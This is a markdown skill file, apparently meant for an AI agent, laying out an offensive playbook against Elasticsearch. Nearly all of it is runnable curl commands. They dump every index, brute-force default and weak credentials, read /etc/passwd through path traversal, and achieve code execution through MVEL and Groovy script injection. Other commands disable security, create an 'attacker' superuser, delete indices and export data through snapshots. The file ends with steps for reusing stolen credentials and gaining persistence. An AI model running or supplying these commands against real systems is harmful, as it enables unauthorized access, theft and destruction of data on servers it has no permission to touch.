---
name: elasticsearch-attack
type: attack
category: database
platform: elasticsearch
severity: critical
---

# Elasticsearch 攻击技能

## 触发条件

- 发现 Elasticsearch 实例
- 可以访问 Elasticsearch API
- 用户要求"攻击 Elasticsearch"

## 前置检查

```bash
# 1. 测试连接
curl http://elasticsearch.example.com:9200/

# 2. 检查版本
curl http://elasticsearch.example.com:9200/ | jq '.version'

# 3. 列出所有索引
curl http://elasticsearch.example.com:9200/_cat/indices?v
```

## 攻击方法

### 方法 1: 未授权访问

```bash
# 1. 尝试无认证访问
curl http://elasticsearch.example.com:9200/

# 2. 列出所有索引
curl http://elasticsearch.example.com:9200/_aliases?pretty

# 3. 读取所有数据
curl -X POST http://elasticsearch.example.com:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "match_all": {}
    }
  }'
```

### 方法 2: 认证绕过

```bash
# 1. 测试默认凭证
# 常见默认凭证: elastic:changeme, elastic:elastic, admin:admin
for user in "elastic:changeme" "elastic:elastic" "admin:admin"; do
  echo "Testing $user"
  curl -u $user http://elasticsearch.example.com:9200/
done

# 2. 测试弱密码
hydra -L users.txt -P passwords.txt \
  elasticsearch.example.com http-get /_search

# 3. 检查是否启用了 X-Pack Security
curl http://elasticsearch.example.com:9200/_xpack/security/user
```

### 方法 3: 敏感数据窃取

```bash
# 1. 列出所有索引
curl http://elasticsearch.example.com:9200/_cat/indices?v

# 2. 获取索引的所有文档
curl -X POST http://elasticsearch.example.com:9200/INDEX_NAME/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "match_all": {}
    },
    "size": 10000
  }'

# 3. 搜索敏感字段
curl -X POST http://elasticsearch.example.com:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "multi_match": {
        "query": "password",
        "fields": ["*"]
      }
    }
  }'

# 4. 导出所有数据
curl -X POST http://elasticsearch.example.com:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {"match_all": {}},
    "size": 10000,
    "_source": ["*"]
  }' > /tmp/elasticsearch-data.json
```

### 方法 4: 文件读取（旧版本）

```bash
# 1. Elasticsearch < 1.4.3 路径遍历漏洞
curl http://elasticsearch.example.com:9200/_plugin/head/../../../../../../etc/passwd

# 2. 读取配置文件
curl http://elasticsearch.example.com:9200/_plugin/head/../../../../../../etc/elasticsearch/elasticsearch.yml

# 3. 读取日志文件
curl http://elasticsearch.example.com:9200/_plugin/head/../../../../../../var/log/elasticsearch/elasticsearch.log
```

### 方法 5: 代码执行（旧版本）

```bash
# 1. Elasticsearch < 1.4.3 MVEL 表达式注入
curl -X POST http://elasticsearch.example.com:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "filtered": {
        "query": {
          "match_all": {}
        },
        "filter": {
          "script": {
            "script": "java.lang.Math.class.forName(\\"java.io.BufferedReader\\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\\"java.io.InputStreamReader\\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\\"java.lang.Runtime\\").getMethod(\\"exec\\",java.lang.Class.forName(\\"java.lang.String\\")).invoke(null,\\"id\\")))}).readLine()"
          }
        }
      }
    }
  }'

# 2. 或通过 Groovy 脚本
curl -X POST http://elasticsearch.example.com:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "filtered": {
        "filter": {
          "script": {
            "script": "def proc = \\"id\\".execute(); proc.waitFor(); proc.text()"
          }
        }
      }
    }
  }'
```

### 方法 6: 配置篡改

```bash
# 1. 关闭认证（如果有管理权限）
curl -X PUT http://elasticsearch.example.com:9200/_xpack/security/ssl/_disable_all

# 2. 创建恶意用户
curl -X POST http://elasticsearch.example.com:9200/_xpack/security/user/attacker \
  -H 'Content-Type: application/json' -d '{
    "password": "password123",
    "roles": ["superuser"]
  }'

# 3. 删除索引数据
curl -X DELETE http://elasticsearch.example.com:9200/INDEX_NAME

# 4. 修改索引映射
curl -X PUT http://elasticsearch.example.com:9200/INDEX_NAME/_mapping \
  -H 'Content-Type: application/json' -d '{
    "properties": {
      "malicious_field": {
        "type": "text"
      }
    }
  }'
```

### 方法 7: Snapshot 利用

```bash
# 1. 注册恶意 Snapshot 仓库
curl -X PUT http://elasticsearch.example.com:9200/_snapshot/malicious_repo \
  -H 'Content-Type: application/json' -d '{
    "type": "fs",
    "settings": {
      "location": "/tmp/snapshots"
    }
  }'

# 2. 创建快照（可能包含敏感数据）
curl -X PUT http://elasticsearch.example.com:9200/_snapshot/malicious_repo/snapshot_1

# 3. 从快照恢复
curl -X POST http://elasticsearch.example.com:9200/_snapshot/malicious_repo/snapshot_1/_restore

# 4. 通过 URL 快照导出数据
curl -X PUT http://elasticsearch.example.com:9200/_snapshot/backup_repo \
  -H 'Content-Type: application/json' -d '{
    "type": "url",
    "settings": {
      "url": "file:///tmp/snapshots"
    }
  }'
```

### 方法 8: 集群信息窃取

```bash
# 1. 获取集群信息
curl http://elasticsearch.example.com:9200/_cluster/health?pretty
curl http://elasticsearch.example.com:9200/_cluster/state?pretty
curl http://elasticsearch.example.com:9200/_cluster/settings?pretty

# 2. 获取节点信息
curl http://elasticsearch.example.com:9200/_nodes/stats?pretty
curl http://elasticsearch.example.com:9200/_nodes/settings?pretty

# 3. 获取所有索引映射
curl http://elasticsearch.example.com:9200/_all/_mapping?pretty

# 4. 获取所有索引设置
curl http://elasticsearch.example.com:9200/_all/_settings?pretty
```

### 方法 9: 脚本注入（动态脚本）

```bash
# 1. 存储脚本（如果启用动态脚本）
curl -X POST http://elasticsearch.example.com:9200/_scripts/attack/groovy \
  -H 'Content-Type: application/json' -d '{
    "script": "java.lang.Runtime.getRuntime().exec(\\"id\\")"
  }'

# 2. 执行存储的脚本
curl -X POST http://elasticsearch.example.com:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "filtered": {
        "filter": {
          "script": {
            "script_id": "attack",
            "lang": "groovy"
          }
        }
      }
    }
  }'
```

### 方法 10: Ingest Pipeline 利用

```bash
# 1. 列出所有 Pipeline
curl http://elasticsearch.example.com:9200/_ingest/pipeline?pretty

# 2. 获取 Pipeline 定义
curl http://elasticsearch.example.com:9200/_ingest/pipeline/PIPELINE_NAME?pretty

# 3. 创建恶意 Pipeline（如果访问不存在的数据）
curl -X PUT http://elasticsearch.example.com:9200/_ingest/pipeline/malicious \
  -H 'Content-Type: application/json' -d '{
    "description": "Malicious pipeline",
    "processors": [
      {
        "set": {
          "field": "malicious_field",
          "value": "{{_ingest.timestamp}}"
        }
      }
    ]
  }'
```

## 验证成功

```bash
# 成功访问
curl http://elasticsearch.example.com:9200/

# 成功列出索引
curl http://elasticsearch.example.com:9200/_cat/indices?v

# 成功读取数据
curl -X POST http://elasticsearch.example.com:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{"query": {"match_all": {}}}'
```

## 下一步

1. 分析窃取的数据中的敏感信息
2. 使用发现的凭证访问其他系统
3. 通过 Elasticsearch 建立持久化
4. 攻击关联的 Logstash/Kibana
